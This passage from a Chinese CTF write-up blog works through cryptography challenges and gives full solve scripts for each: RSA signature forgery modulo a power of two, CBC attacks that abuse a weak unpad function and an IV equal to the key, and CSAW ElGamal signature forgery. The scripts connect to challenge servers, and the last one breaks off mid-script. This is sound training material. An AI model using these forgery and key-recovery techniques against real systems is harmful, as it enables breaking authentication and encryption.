<p><em>好家伙，有地方省赛出到这道题了，我。。<del>（原来没有出的题目是可以重复利用的）</del></em></p>
<p><em>期间很多人私聊我这道题，唔，可是我太菜了，始终不会，对不起各位师傅</em></p>
<p><em>但是在众师傅的协力下，有师傅在评论区留下他的解法，更新一下</em></p>
<p>有种发现新大陆的感觉</p>
<p>其实不知道n也是完全可以的，我这样搞出n反而把自己带偏</p>
<p>关键是构造一个在模2的倍数（且和3互素）的几次幂下的RSA签名，因为n是足够大的，完全可以构造使得三次方验证的时候，计算结果是小于模数的，也就是不用考虑n；但问题是模这样一个数为什么可以保留最低位</p>
<p>想了几天没想明白，有机会再问问别的师傅，先收了</p>
<p>初步理解是$c^3$低位就是f，因为在模$2^x$下，会保留低x位，这个比较容易懂；所以在$c^3$又是在RSA中的验证环节，得到的m，由于f是先d次方得到的c，在这个RSA签名验证的环节，低x位是成立的，所以m的低x位就是f。这应该是模$2^x$次方的性质（但好像模$14^x$也可以，不懂了）</p>
<p>完整的exp，贴</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># :20</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment"># sh = process([&quot;python&quot;, &quot;server.py&quot;])</span></span><br><span class="line">payload1 = sh.recvuntil(<span class="string">b&#x27;Your vote:&#x27;</span>).decode()</span><br><span class="line">payload1 = findall(<span class="string">r&quot;\d+&quot;</span>, payload1)[<span class="number">0</span>]</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;]\n&#x27;</span>)</span><br><span class="line">flag1 = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20:</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">f = bytes_to_long(<span class="string">b&#x27;:Biden!&#x27;</span>)</span><br><span class="line">N = <span class="number">2</span> ** <span class="number">47</span></span><br><span class="line">phiN = <span class="number">2</span> ** <span class="number">46</span></span><br><span class="line">d = invert(e, phiN)</span><br><span class="line">c = <span class="built_in">pow</span>(f, d, N)</span><br><span class="line">payload2 = <span class="built_in">str</span>(c)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;]\n&#x27;</span>)</span><br><span class="line">flag2 = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1 + flag2)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211005133747776.png" alt="image-20211005133747776"></p>
<p>当然flag是假的</p>
<h2 id="Yusa的密码学课堂—CBC第二课（recuring）"><a href="#Yusa的密码学课堂—CBC第二课（recuring）" class="headerlink" title="Yusa的密码学课堂—CBC第二课（recuring）"></a>Yusa的密码学课堂—CBC第二课（recuring）</h2><p>这道题感觉似曾相识，但是一直执着于三个CBC分块，一下午脑子都绕晕，尚师傅二十分钟就出了；做题太少，感觉不够，不敢跳出去</p>
<p><em>如果你觉得勤奋在天赋面前不值一提，那说明你不够努力</em></p>
<p>来看主要代码逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = os.urandom(<span class="number">16</span>)</span><br><span class="line">        iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">        cipher = _enc(flag, key, iv).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        paintext = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;Amazing function: &quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(enc(paintext, key).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">        backdoor = <span class="built_in">input</span>(<span class="string">&quot;Another amazing function: &quot;</span>)</span><br><span class="line">        <span class="keyword">assert</span> backdoor != cipher</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> dec(<span class="built_in">bytes</span>.fromhex(backdoor), key, iv) == flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wow, amazing results.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>先加密flag，然后给我们一个自己定IV和Plaintext的机会，进行加密，最后我们输入密文，提供一个解密的机会，如果这个解密的结果等于flag，但是我们输入的密文不能是flag加密后的密文，那么就输出flag</p>
<p>乍一听，不可能啊，一个不是flag加密得到的密文，进行解密也可以得到flag？？？</p>
<p>所以这道题就有其特殊性，这里有一个pad和unpad函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span> <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> pad_len == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">return</span> data + <span class="built_in">chr</span>(pad_len) * pad_len</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">    num = <span class="built_in">ord</span>(data[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> data[:-num]</span><br></pre></td></tr></table></figure>

<p>这里unpad是关键，会根据最后一位将加上的pad给去掉；一般来说是没有问题的，但是如果有不怀好意的人（尚师傅）刻意构造假的pad，那么情况就不一样了（所以很好奇Crypto库里的unpad函数是怎么实现的呢）</p>
<p>关于CBC基本流程可以看<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">Macaw_Revenge</a>，而这道题尚师傅说可以从<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">Xoro</a>获得提示</p>
<p>借一下上次的图</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC.png" alt="AES_CBC"></p>
<p>直接说做法了，可以看出，无论我们在这三块中如何闹腾，都不可能整出一个解密是flag却又不是flag对应的密文</p>
<p>所以我们不妨手动加上一块，密文块2作为IV，而明文块3我们让最后其最后一位是<code>16+flag的填充位数</code>转字节；这样就可以在加密的过程中，完全可以把这一块和前面三块并在一起，相当于加密<code>flag+我们自己的填充</code>，而解密出来在unpad的时候，由于unpad的机制，就把所有的pad，包括flag本身的，以及我们添加的pad全部去掉了，得到的就是flag，但是密文不同</p>
<p>因为环境关了，在本地复现的，报一些奇怪的错，最后想要的已经求出来send过去了，但是在unpad的时候有问题；虽然原脚本是py2的，但是运行这个老是因为各种换行的IO错误，最后还是改了下unpad这个函数，加了第一句转字符串的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210908210437443.png" alt="image-20210908210437443"></p>
<p>这样下面这个脚本在本地就可以打通了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./server_py3.py&quot;</span>])</span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">c0, c1, c2 = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:<span class="number">32</span>], cipher[<span class="number">32</span>:]</span><br><span class="line"><span class="comment"># len(cipher) == 48</span></span><br><span class="line"><span class="comment"># our plaintext</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Amazing function:&#x27;</span>)</span><br><span class="line">pad = <span class="built_in">chr</span>(<span class="number">8</span>+<span class="number">16</span>).encode() * <span class="number">16</span></span><br><span class="line">sh.sendline(pad.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># our iv</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your iv: &#x27;</span>)</span><br><span class="line">sh.sendline(c2.<span class="built_in">hex</span>())</span><br><span class="line">cx = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"><span class="comment"># our backdoor</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Another amazing function: &#x27;</span>)</span><br><span class="line">backdoor = cipher + cx</span><br><span class="line">sh.sendline(backdoor.<span class="built_in">hex</span>())</span><br><span class="line">flag = sh.recvline().decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>flag是我自己uuid的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210908210552799.png" alt="image-20210908210552799"></p>
<p>因为看原附件中<code>DASCTF&#123;*********&#125;</code>总长度是40，所以上面才这么果断设置了pad为<code>chr(8+16).encode()*16</code>；如果不是的话，可以从一开始的密文知道，48长，也就是分三段，flag至少33长，稍微爆破下也可以出来的</p>
<h2 id="Yusa的密码学课堂—CBC第三课（recuring）"><a href="#Yusa的密码学课堂—CBC第三课（recuring）" class="headerlink" title="Yusa的密码学课堂—CBC第三课（recuring）"></a>Yusa的密码学课堂—CBC第三课（recuring）</h2><p>这道题就把pad给改掉了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">	pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span>  <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> data + <span class="string">&quot;=&quot;</span> * pad_len</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">	<span class="keyword">return</span> data.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>来看主逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		key = os.urandom(<span class="number">16</span>)</span><br><span class="line">		asuy = enc(flag,key)</span><br><span class="line">		<span class="built_in">print</span> asuy.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		paintext = raw_input(<span class="string">&quot;Amazing function(in hex): &quot;</span>)</span><br><span class="line">		paintext = paintext.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span> enc(paintext,key).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		asuy = raw_input(<span class="string">&quot;Another amazing function(in hex): &quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		yusa = dec(asuy,key)</span><br><span class="line"></span><br><span class="line">		flag_l = s_2_l(flag)</span><br><span class="line">		yusa_l = s_2_l(yusa)</span><br><span class="line">		<span class="keyword">for</span> each <span class="keyword">in</span> yusa_l:</span><br><span class="line">			<span class="keyword">if</span> each <span class="keyword">in</span> flag_l:</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">r&quot;You&#x27;re not yusa!&quot;</span>)</span><br><span class="line">				exit()</span><br><span class="line">		<span class="built_in">print</span> yusa.encode(<span class="string">&#x27;hex&#x27;</span>)		</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span> <span class="built_in">str</span>(e)</span><br><span class="line">		exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	task()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先对flag进行加密，IV和KEY是相同的</p>
<p>然后是一个加密，可以由我们自己指定的明文的，而且IV和KEY也是之前的IV和KEY</p>
<p>最后是一个解密，同样也是IV和KEY</p>
<hr>
<p>为什么会有人KEY=IV？为什么我还不知道漏洞？</p>
<p>最后一步，没有直接给flag，如果通过了for循环，那么可以得到你自己输入的密文的明文，但是如果没有通过，说明你指定的密文得到的明文有flag的一部分，emmmmm那还是没通过的好。不过不通过的话，又得不到解密的结果，还是白给。但是如果通过了，说明我们是已经知道flag的内容，并且加以一定的方式将其绕过，也就没有再输出明文的必要。。。事情开始向不好的方向发展</p>
<p>结合我们已经有flag的密文，可以搞点事情</p>
<p><strong>所以总结一下，到此为止，联系上一道题，这里就是给你flag的密文，但是又提供你解密的机会，但是要求解密出来的东西里面十六块一部分的十六块一部分的不和flag中的不完全相同（绕过判定机制），但是你知道怎么从这个解密结果里面看出flag；至于如何构造？大概率就是利用中间的那个已知明文，相同key的加密</strong></p>
<p>显然</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210909082357017.png" alt="image-20210909082357017"></p>
<p>如果是第二题，我们利用这种方法也可以得到，可以得到与flag对应的密文不同的密文；但这道题不行，因为它是判断明文之间的比较。有什么办法将一些pad插入到明文0~2中吗</p>
<p><em>最烦的就是，KEY和IV一样真的没有利用点吗</em></p>
<p><em>想了一个晚上还有第二天的网络安全课，课上也糟糟的，不知道说什么好，以为出不来又要作罢了。可是尚师傅花了一节python课的时间就弄明白这是怎么一回事了</em></p>
<p><em>此刻我已经找不到足以表达我崇拜之情的表情包了.jpg</em></p>
<hr>
<p>下面开始整活，确实，攻击点不在我上面一直在纠结的博弈上。由于KEY和IV一样，这就可以提供我们很大的便利，这也算是这个系统的漏洞吧。最后一层解密不应该看做得到flag的直接途径，而是看成一次解密的机会更好</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/cbc.jpg" alt="cbc"></p>
<p>图上说的很清楚，左边是flag的加密过程，右边是我们借助已有的条件进行攻击的过程。主要的思路就是，因为KEY=IV，又分别有一次加密和解密，那为什么不直接把IV和KEY搞出来呢</p>
<p>在我们自由控制明文的那里，我们输入两块全是<code>\x00</code>的字节流，为的是消除明文对加密过程产生不可干预的影响，这样整个加密流程，除了KEY一切就变得透明起来</p>
<p>做完一次加密，我们得到了两密文，再加上我们还剩下一次解密的机会，如果你和尚师傅一样聪明，就可以想到把刚才的加密的流程给拆开，其中一半用解密函数来完全道破，另一半也就不攻自破</p>
<p>正如图上所画将<code>c4</code>送过去解密，得到<code>回显</code>；显然<code>回显^key</code>就是<code>c4</code>通过加密之前的<code>c3</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210909131814443.png" alt="image-20210909131814443"></p>
<p>即<code>回显 ^ key = c3</code>，那么<code>c3</code>已知，<code>key = c3 ^ 回显</code>，就此我们得到key，后面再现aes解密就好了</p>
<p>完整的本地exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./server_py3.py&quot;</span>])</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">c1, c2, c3 = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:<span class="number">32</span>], cipher[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Amazing function(in hex): &#x27;</span>)</span><br><span class="line">plaintext = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">32</span></span><br><span class="line">sh.sendline(plaintext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">cx = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Another amazing function(in hex): &#x27;</span>)</span><br><span class="line">yusa = cx[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">sh.sendline(yusa.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">asuy = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">keyx = xor(asuy[:<span class="number">32</span>], cx[:<span class="number">16</span>])</span><br><span class="line"><span class="keyword">assert</span> key == keyx</span><br><span class="line">aes = AES.new(keyx, AES.MODE_CBC, keyx)</span><br><span class="line"><span class="built_in">print</span>(unpad(aes.decrypt(cipher)).decode())</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210909132014232.png" alt="image-20210909132014232"></p>
<p>可以打通</p>
<p>当然和第二题一样，pad和unpad函数也做过一丢丢的修改，不知道这个修改伤不伤大雅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span> <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> pad_len == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">&quot;=&quot;</span> * pad_len</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> data.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我觉得非常不好，好吃懒做，脑子不灵光，注意力不集中，转牛角尖，死咬一道题不放（WM也），导致今天效率很慢</p>
<p>如果天赋不够，那就用勤奋来弥补吧</p>
<p>总结一下可以发现，今天的题目并不难（bushi第一题还没想出来），想不到就是想不到，想到了就是走一遍流程的问题，有很多小细节和平时的积累有关；然后在今天的做这些题目的过程中，我也尝试经历了出题，测试的环节，感觉确实很多讲究，现在还是本地了，如果放到服务器上，打在端口上，对出题人的要求更大；在此向所有合格的出题人表示敬意和感谢</p>
<p>我也会继续前进的，不择手段地前进——Thomas Wade</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210911 CSAWCTFCrypto方向部分WP</title>
    <url>/posts/e4da15f1/</url>
    <content><![CDATA[<p>好耶，妈妈以后再也不用担心，服务被关掉了</p>
<p>emmmmm没有源码，呜，苦露西</p>
<span id="more"></span>

<h1 id="CSAWCTF"><a href="#CSAWCTF" class="headerlink" title="CSAWCTF"></a>CSAWCTF</h1><h2 id="Gotta-Decrypt-Them-All"><a href="#Gotta-Decrypt-Them-All" class="headerlink" title="Gotta Decrypt Them All"></a>Gotta Decrypt Them All</h2><blockquote>
<p>nc crypto.chal.csaw.io 5001</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Morse <span class="keyword">import</span> morse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;crypto.chal.csaw.io&#x27;</span>, <span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line">letmesee = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;What does this mean?\r\n&#x27;</span>)</span><br><span class="line">        c1 = sh.recvline().decode().strip()</span><br><span class="line">        c1 = c1.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">            plaintext += <span class="built_in">chr</span>(<span class="built_in">int</span>(morse(i.strip(), <span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">        plaintext = b64decode(plaintext).decode()</span><br><span class="line">        plaintext = plaintext.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        c = <span class="built_in">int</span>(plaintext[<span class="number">2</span>][<span class="number">4</span>:])</span><br><span class="line">        plaintext = iroot(c, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        plaintext = long_to_bytes(plaintext).decode()</span><br><span class="line">        plaintext = codecs.encode(plaintext, <span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line">        letmesee += plaintext</span><br><span class="line">        letmesee += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        sh.sendline(plaintext)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(letmesee)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pokemon Names Wormadam Stonjourner Cloyster Jynx Zorua</p>
</blockquote>
<h2 id="Forgery（recuring）"><a href="#Forgery（recuring）" class="headerlink" title="Forgery（recuring）"></a>Forgery（recuring）</h2><blockquote>
<p>nc crypto.chal.csaw.io 5006</p>
</blockquote>
<blockquote>
<p>Felicity and Cisco would like to hire you as an intern for a new security company that they are forming. They have given you a black box signature verification system to test out and see if you can forge a signature. Forge it and you will get a passphrase to be hired!</p>
</blockquote>
<p>又是这个Forgery，伪造文书，先做RSA</p>
<hr>
<p>emmmmm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">answer: <span class="built_in">str</span>, r: <span class="built_in">int</span>, s: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span></span><br><span class="line">    m = <span class="built_in">int</span>(answer, <span class="number">16</span>) &amp; MASK</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([x &lt;= <span class="number">0</span> <span class="keyword">or</span> x &gt;= p - <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> [m, r, s]]):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, m, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p</span><br></pre></td></tr></table></figure>

<p>emmmmm</p>
<p>不愧是春哥师傅，复现的时候竟然发现了是这道原题，<a href="https://blog.csdn.net/m0_49109277/article/details/120402679">贴我自己的链接好了（doge）</a>，第一种方法不是没看懂嘛，看看TIME上的能不能看懂（我擦127解，自己还是太菜了）</p>
<p>比赛结束了，那就自己挂自己打</p>
<p>这里g=3，嗯？老DC了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MASK = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u = <span class="string">b&#x27;Felicity Cisco&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">    sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    content = sh.recvuntil(<span class="string">b&#x27;Answer:&#x27;</span>).decode()</span><br><span class="line">    p, g, y = findall(<span class="string">r&quot;\d+&quot;</span>, content)</span><br><span class="line">    p, y = <span class="built_in">int</span>(p), <span class="built_in">int</span>(y)</span><br><span class="line">    u, r, s = u + <span class="built_in">hex</span>((p - <span class="number">1</span>) // <span class="number">2</span>)[<span class="number">2</span>:].rjust(<span class="number">1024</span>, <span class="string">&#x27;0&#x27;</span>), (p - <span class="number">1</span>) // <span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    sh.sendline(u)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;r:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;s:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(s))</span><br><span class="line">    flag = sh.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922205145757.png" alt="image-20210922205145757"></p>
<p>观赏性</p>
<p>另外一种解法，参考这篇<a href="https://core.ac.uk/download/pdf/48535618.pdf">论文</a>，后面有证明，里面先假设我们已经有一个对$(r,\ s)$符合等式，其他的证明直接参考论文吧，目前对证明没什么感觉（emmmmm所以没有必要复现这种方法，直接抄论文）</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210924083850936.png" alt="image-20210924083850936"></p>
<p>为了使得<br>$$<br>g^u\equiv_py^rr^s<br>$$</p>
<p>直接抄论文里的结论</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210924152637456.png" alt="image-20210924152637456"></p>
<p>令（感觉论文有点小错，抄春哥师傅的，下面这样设置参数没问题）<br>$$<br>r\equiv_pg^By^C<br>$$<br>$$<br>s\equiv_{p-1}-rC^{-1}<br>$$<br>$$<br>u\equiv_{p-1}-rC^{-1}B<br>$$<br>随机选取$B, C\in[2, p-2]$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MASK = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">1</span></span><br><span class="line">g = <span class="number">3</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span 